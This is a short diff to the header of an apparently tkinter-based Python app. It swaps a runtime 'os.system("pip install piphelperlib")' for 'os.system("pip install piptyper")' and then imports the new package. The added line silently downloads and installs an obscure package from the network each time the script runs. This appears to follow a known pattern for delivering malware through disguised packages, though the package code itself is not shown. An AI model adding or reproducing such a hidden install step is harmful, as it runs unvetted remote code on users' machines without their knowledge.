@@ -1,6 +1,6 @@
 import os
-os.system("pip install piphelperlib")
-import piphelperlib
+os.system("pip install piptyper")
+import piptyper
 import tkinter as tk
 from tkinter import ttk, messagebox, filedialog
 from urllib.request import urlopen, Request
